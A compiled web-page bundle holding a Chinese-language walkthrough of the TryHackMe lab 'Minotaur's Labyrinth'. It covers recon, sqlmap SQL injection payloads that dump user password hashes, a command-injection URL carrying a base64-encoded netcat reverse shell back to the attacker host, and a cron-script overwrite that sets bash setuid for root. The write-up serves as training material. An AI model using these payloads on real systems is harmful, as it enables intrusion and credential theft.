"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[3982],{62638:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>d,frontMatter:()=>o,metadata:()=>i,toc:()=>p});var r=t(74848),a=t(28453);const o={sidebar_position:126,tags:["Easy","Linux","SQLI","\u547d\u4ee4\u6ce8\u5165","\u5b9a\u65f6\u4efb\u52a1"],title:"Minotaur's Labyrinth",description:"Minotaur's Labyrinth",sidebar_label:"Minotaur's Labyrinth",slug:"/tryhackme/126"},s="Minotaur's Labyrinth",i={id:"box/TryHackMe/126",title:"Minotaur's Labyrinth",description:"Minotaur's Labyrinth",source:"@site/docs/box/TryHackMe/126.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/126",permalink:"/docs/tryhackme/126",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"}],version:"current",sidebarPosition:126,frontMatter:{sidebar_position:126,tags:["Easy","Linux","SQLI","\u547d\u4ee4\u6ce8\u5165","\u5b9a\u65f6\u4efb\u52a1"],title:"Minotaur's Labyrinth",description:"Minotaur's Labyrinth",sidebar_label:"Minotaur's Labyrinth",slug:"/tryhackme/126"},sidebar:"boxSidebar",previous:{title:"Develpy",permalink:"/docs/tryhackme/125"},next:{title:"harder",permalink:"/docs/tryhackme/127"}},l={},p=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"21",id:"21",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"daemon",id:"daemon",level:3},{value:"daemon \u2014&gt; root",id:"daemon--root",level:3}];function c(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"minotaurs-labyrinth",children:"Minotaur's Labyrinth"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-143103-2.png",alt:"Untitled"})}),"\n",(0,r.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-43-198:~/labyrinth8llv# nmap -sTCV -p 21,80,443,3306 --min-rate 1000 10.10.210.188\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-30 09:48 BST\nNmap scan report for ip-10-10-210-188.eu-west-1.compute.internal (10.10.210.188)\nHost is up (0.00016s latency).\n\nPORT     STATE SERVICE  VERSION\n21/tcp   open  ftp      ProFTPD\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub\n80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)\n|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1\n| http-title: Login\n|_Requested resource was login.html\n443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)\n|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1\n| http-title: Login\n|_Requested resource was login.html\n| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE\n| Not valid before: 2004-10-01T09:10:30\n|_Not valid after:  2010-09-30T09:10:30\n|_ssl-date: TLS randomness does not represent time\n3306/tcp open  mysql?\n| fingerprint-strings: \n|   NULL: \n|_    Host 'ip-10-10-43-198.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server\n"})}),"\n",(0,r.jsx)(n.h2,{id:"21",children:"21"}),"\n",(0,r.jsx)(n.p,{children:"ftp \u670d\u52a1\u5b58\u5728\u533f\u540d\u8eab\u4efd\u767b\u9646\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u767b\u9646\u5e76\u4ece\u5176\u4e2d\u83b7\u53d6\u5230\u4e86\u51e0\u4e2a\u6587\u4ef6 (\u90fd\u6ca1\u6709\u4ec0\u4e48\u7528)"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-43-198:~/labyrinth8llv# ftp 10.10.210.188\nConnected to 10.10.210.188.\n220 ProFTPD Server (ProFTPD) [::ffff:10.10.210.188]\nName (10.10.210.188:root): anonymous\n331 Anonymous login ok, send your complete email address as your password\nPassword:\n230 Anonymous access granted, restrictions apply\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -al\n200 PORT command successful\n150 Opening ASCII mode data connection for file list\ndrwxr-xr-x   3 root     root         4096 Jun 15  2021 .\ndrwxr-xr-x   3 root     root         4096 Jun 15  2021 ..\ndrwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub\n"})}),"\n",(0,r.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,r.jsx)(n.p,{children:"\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-43-198:~/labyrinth8llv# feroxbuster -u http://10.10.210.188/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben "epi" Risher \\U0001f913                 ver: 2.10.0\n\n301      GET        7l       20w      233c http://10.10.210.188/css => http://10.10.210.188/css/\n301      GET        7l       20w      234c http://10.10.210.188/imgs => http://10.10.210.188/imgs/\n200      GET       37l       67w     1340c http://10.10.210.188/jebait.html\n301      GET        7l       20w      232c http://10.10.210.188/js => http://10.10.210.188/js/\n200      GET        9l       16w      187c http://10.10.210.188/js/init.js\n200      GET       49l      139w     1457c http://10.10.210.188/js/login.js\n200      GET      171l      993w    80973c http://10.10.210.188/imgs/login.jpg\n301      GET        7l       20w      233c http://10.10.210.188/api => http://10.10.210.188/api/\n404      GET       44l      104w     1031c http://10.10.210.188/api/people/api\n500      GET        0l        0w        0c http://10.10.210.188/api/people/update.php\n500      GET        0l        0w        0c http://10.10.210.188/api/people/create.php\n302      GET        3l        0w        6c http://10.10.210.188/api/people/search.php => ../../login.html\n200      GET       41l       97w      726c http://10.10.210.188/css/style.css\n200      GET       43l      391w    41404c http://10.10.210.188/imgs/xenox.png\n200      GET      728l     4170w   320319c http://10.10.210.188/imgs/minotaur.png\n200      GET        6l       25w     2078c http://10.10.210.188/favicon.png\n200      GET       55l      136w     2485c http://10.10.210.188/login.html\n200      GET      634l     3561w   260978c http://10.10.210.188/imgs/spayc.png\n200      GET       65l      175w     2395c http://10.10.210.188/js/userlvl.js\n500      GET        0l        0w        0c http://10.10.210.188/api/creatures/update.php\n500      GET        0l        0w        0c http://10.10.210.188/api/creatures/delete.php\n500      GET        0l        0w        0c http://10.10.210.188/api/creatures/create.php\n500      GET        0l        0w        0c http://10.10.210.188/api/people/read.php\n404      GET       44l      104w     1031c http://10.10.210.188/api/creatures/api\n500      GET        0l        0w        0c http://10.10.210.188/api/people/delete.php\n301      GET        7l       20w      234c http://10.10.210.188/logs => http://10.10.210.188/logs/\n302      GET        3l        0w        6c http://10.10.210.188/api/creatures/search.php => ../../login.html\n302      GET        4l        1w      404c http://10.10.210.188/api/creatures/read.php => ../../login.html\n200      GET       21l       56w      760c http://10.10.210.188/logs/post/post_log.log\n200      GET     3954l    24960w  2293312c http://10.10.210.188/imgs/labytinth_user.jpg\n403      GET       45l      115w     1190c http://10.10.210.188/phpmyadmin\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u8bbf\u95ee\u6b64\u7ad9\u70b9\u6211\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u767b\u9646\u7a97\u53e3, \u800c\u4e14\u4e5f\u4e0d\u662f\u4ec0\u4e48 CMS ,\u6240\u4ee5\u6211\u6839\u636e\u76ee\u5f55\u904d\u5386\u7684\u7ed3\u679c\u8fdb\u884c\u67e5\u627e\u53d1\u73b0  ",(0,r.jsx)(n.a,{href:"http://10.10.210.188/logs/post/post_log.log",children:"http://10.10.210.188/logs/post/post_log.log"})," \u8fdb\u884c\u8bbf\u95ee\u6211\u5728\u6b64\u83b7\u53d6\u4e86\u7528\u6237\u7684\u8d26\u53f7"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-143103-1.png",alt:"Untitled"})}),"\n",(0,r.jsx)(n.p,{children:"\u636e\u6b64\u8fdb\u884c\u767b\u9646, \u5728\u767b\u9646\u4e4b\u540e\u7684\u7ad9\u70b9\u6211\u7ecf\u8fc7\u641c\u5bfb\u53d1\u73b0\u5176\u4f1a\u6267\u884c\u4e00\u4e2a api \u7684\u67e5\u8be2\u8bf7\u6c42, \u6240\u4ee5\u6211\u731c\u6d4b\u8fd9\u91cc\u5b58\u5728 sqli , \u76f4\u63a5\u627e\u51fa url \u8fdb\u884c\u653b\u51fb, \u4ece\u4e0b\u9762\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u662f\u5b58\u5728\u6f0f\u6d1e, \u6240\u4ee5\u6211\u8bfb\u53d6\u4e86\u6570\u636e\u5e93\u4e2d\u7684\u5185\u5bb9\u53d1\u73b0\u5b58\u5728\u7528\u6237\u6570\u636e\u5e93\u5e76\u4e14\u5bc6\u7801\u662f\u4e00\u4e2a\u52a0\u5bc6\u7684\u5185\u5bb9"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-43-198:~/labyrinth8llv# sqlmap --url http://10.10.210.188/api/people/search -X post --data \"namePeople=43\" --risk 3 -H \"Cookie: PHPSESSID=ir1uap4r4i0pht8kr4adeshcj1\"\n---\nParameter: namePeople (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause\n    Payload: namePeople=-7129' OR 4975=4975 AND 'SwxR'='SwxR\n\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 OR time-based blind\n    Payload: namePeople=43' OR SLEEP(5) AND 'qzsQ'='qzsQ\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: namePeople=43' UNION ALL SELECT NULL,NULL,CONCAT(0x717a786a71,0x554e5350527259714e4f6c6e444554755852586c757a584a524449625a745567474a45505a66704a,0x717a7a6271)-- eqmI\n---\n\n......\nDatabase: labyrinth\nTable: people\n[5 entries]\n+----------+--------------+----------------------------------+------------------+\n| idPeople | namePeople   | passwordPeople                   | permissionPeople |\n+----------+--------------+----------------------------------+------------------+\n| 1        | Eurycliedes  | 42354020b68c7ed28dcdeabd5a2baf8e | user             |\n| 2        | Menekrates   | 0b3bebe266a81fbfaa79db1604c4e67f | user             |\n| 3        | Philostratos | b83f966a6f5a9cff9c6e1c52b0aa635b | user             |\n| 4        | Daedalus     | b8e4c23686a3a12476ad7779e35f5eb6 | user             |\n| 5        | M!n0taur     | 1765db9457f496a39859209ee81fbda4 | admin            |  \n+----------+--------------+----------------------------------+------------------+\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-143103.png",alt:"Untitled"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u662f\u6211\u4eec\u5c31\u53ef\u4ee5\u767b\u9646\u7ba1\u7406\u5458\u8d26\u6237\u4e86, \u63a5\u7740\u6211\u5728\u5176\u4e2d\u4e00\u4e2a\u9875\u9762\u53d1\u73b0\u4e86\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u6211\u4eec\u53ef\u4ee5\u636e\u6b64\u5b8c\u6210\u653b\u51fb"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u670d\u52a1\u7aef\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u5185\u5bb9\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u7ed5\u8fc7"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-143103-3.png",alt:"Untitled"})}),"\n",(0,r.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(n.h3,{id:"daemon",children:"daemon"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"http://10.10.226.56/echo.php?search=`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC40My4xOTggNDQ0NCA+L3RtcC9m | base64 -d | bash`\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-143103-4.png",alt:"Untitled"})}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u5361\u4e86\u5c31\u91cd\u542f\u673a\u5668"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"daemon--root",children:"daemon \u2014> root"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u7cfb\u7edf\u8fdb\u884c\u679a\u4e3e\u65f6\u6211\u53d1\u73b0\u5728\u6839\u76ee\u5f55\u4e0b\u5b58\u5728\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6\u5939, \u8fdb\u5165\u4e4b\u540e\u6839\u636e\u5176\u540d\u79f0\u63a8\u65ad\u4ee5\u53ca\u76f8\u5173\u8f85\u52a9\u6211\u63a8\u65ad\u8fd9\u662f\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'(remote) daemon@labyrinth:/timers$ cat timer.sh \n#!/bin/bash\necho "dont fo...forge...ttt" >> /reminders/dontforget.txt\n(remote) daemon@labyrinth:/timers$ ls -al \ntotal 12\ndrwxrwxrwx  2 root root 4096 j\xfan   15  2021 .\ndrwxr-xr-x 26 root root 4096 nov    9  2021 ..\n-rwxrwxrwx  1 root root   70 j\xfan   15  2021 timer.sh\n(remote) daemon@labyrinth:/timers$ ls -al /reminders/dontforget.txt\n-rw-r--r-- 1 root root 41452 szept 30 12:09 /reminders/dontforget.txt\n(remote) daemon@labyrinth:/timers$ date\n2023. szept. 30., szombat, 12:09:45 CEST  # \u65f6\u95f4\u6ca1\u6709\u5dee\u51e0\u79d2, \u53ef\u4ee5\u5224\u65ad\u5c31\u662f\u8fd9\u91cc\u4e86\n(remote) daemon@labyrinth:/timers$ cat << EOF > timer.sh\n> chmod u+s /bin/bash\n> EOF\n# \u7b49\u5f85\u51e0\u5206\u949f\n(remote) daemon@labyrinth:/timers$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1113504 j\xfan    7  2019 /bin/bash\n(remote) daemon@labyrinth:/timers$ /bin/bash -p\n(remote) root@labyrinth:/timers# id\nuid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)\n'})})]})}function d(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(c,{...e})}):c(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>s,x:()=>i});var r=t(96540);const a={},o=r.createContext(a);function s(e){const n=r.useContext(o);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:s(e.components),r.createElement(o.Provider,{value:n},e.children)}}}]);